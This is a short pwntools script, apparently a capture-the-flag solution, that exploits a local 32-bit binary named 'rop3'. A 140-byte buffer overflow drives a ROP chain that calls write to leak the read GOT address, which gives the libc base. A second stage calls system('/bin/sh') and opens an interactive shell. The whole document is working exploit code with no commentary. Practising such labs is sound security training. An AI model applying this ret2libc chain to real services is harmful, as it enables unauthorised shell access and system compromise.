from pwn import *

e = ELF("rop3")
libc = e.libc

read_got = e.got['read']
write_plt = e.plt['write']
vuln_addr = e.sym["vulnerable_function"]

print(hex(write_plt), hex(read_got), hex(vuln_addr))

p = process("./rop3")

payload = b"A"*140
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(0x1)
payload += p32(read_got)
payload += p32(0x4)

p.send(payload)

read_libc_addr = p.recv()
print(read_libc_addr)


libc.address = int.from_bytes(read_libc_addr, "little") - libc.sym["read"]

secondstage = b"A" * 140
secondstage += p32(libc.sym["system"])
secondstage += p32(libc.sym["exit"])
secondstage += p32(next(libc.search(b'/bin/sh\x00')))

p.send(secondstage)
p.interactive()
